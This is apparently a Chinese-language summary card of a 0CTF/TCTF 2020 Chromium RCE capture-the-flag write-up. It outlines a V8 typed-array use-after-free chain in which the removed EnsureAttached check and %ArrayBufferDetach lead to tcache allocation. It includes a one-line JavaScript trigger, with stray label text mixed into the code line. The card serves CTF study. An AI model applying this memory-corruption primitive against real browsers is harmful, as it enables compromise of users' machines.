---
title: "沙箱逃逸之0ctf2020 chromium_rce writeup"
category: web
tags: ["0CTF/TCTF 2020", "web", "Chromium RCE", "V8 typed-array-set", "EnsureAttached去除", "tcache"]
signals: ["0CTF/TCTF 2020 2020", "Chromium RCE", "V8 typed-array-set", "EnsureAttached去除", "tcache", "ArrayBufferDetach", "0day", "rce", "CTF", "TCTF", "Chromium", "RCE", "typed-array-set", "bypass"]
difficulty: insane
source: "https://www.ctfiot.com/94732.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 沙箱逃逸之0ctf2020 chromium_rce writeup

> 赛事：0CTF/TCTF 2020 2020 | 方向：web | 难度：insane

## 一句话总结

0CTF/TCTF 2020 Chromium RCE：typed-array-set bypass+ArrayBufferDetach+UAF tcache

## 攻击链

1. typed-array-set.tq移除EnsureAttached检查→typedarray不再验证buffer是否detached→%ArrayBufferDetach(a.buffer)释放a→a.set(b)写入freed mem→b.set(a)读取freed mem→tcache分配

## 关键 payload

```
var a = new Uint8Array(0x200); var b = new Uint8Array(0x200); %ArrayBufferDetach(a.buffer); a.set(b); b.set(a);EnsureAttached bypass;%ArrayBufferDetach intrinsic
```

## 经验教训

V8 typed-array-set中EnsureAttached是关键安全检查；parser-base.h允许%ArrayBufferDetach intrinsic

## 标签

Chromium RCE、V8 typed-array-set、EnsureAttached去除、tcache、ArrayBufferDetach、0day

## 参考来源

- https://www.ctfiot.com/94732.html
- 原文件：沙箱逃逸之0ctf2020_chromium_rce_writeup.full.md
